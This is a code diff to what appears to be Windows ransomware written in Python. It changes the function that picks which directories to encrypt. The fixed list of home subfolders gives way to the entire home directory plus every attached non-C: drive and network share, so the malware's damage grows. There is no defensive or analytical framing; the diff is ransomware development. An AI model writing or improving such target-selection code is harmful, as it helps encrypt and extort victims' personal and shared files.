@@ -112,24 +112,16 @@ class Base():
 
     def get_base_dirs(self, home_dir):
       # Function to return a list of base directories to encrypt
-      # TODO Detect presence of network drives
-      # TODO Improve overall functionality for getting list of locations to encrypt
-
-      base_dirs = [
-                    os.path.join(home_dir, "Desktop"),
-                    os.path.join(home_dir, "Documents"),
-                    os.path.join(home_dir, "Downloads"),
-                    os.path.join(home_dir, "Music"),
-                    os.path.join(home_dir, "Pictures"),
-                    os.path.join(home_dir, "Videos")
-                  ]
-
-
-      # Add attached drives and file shares, etc.
+      base_dirs = []
+      
+      # Add attached drives and file shares
       attached_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
       for drive in attached_drives:
           if drive[0] != 'C':
               base_dirs.append(drive)
+      
+      # Add C:\\ user space directories
+      base_dirs.append(home_dir)
           
 
       return base_dirs
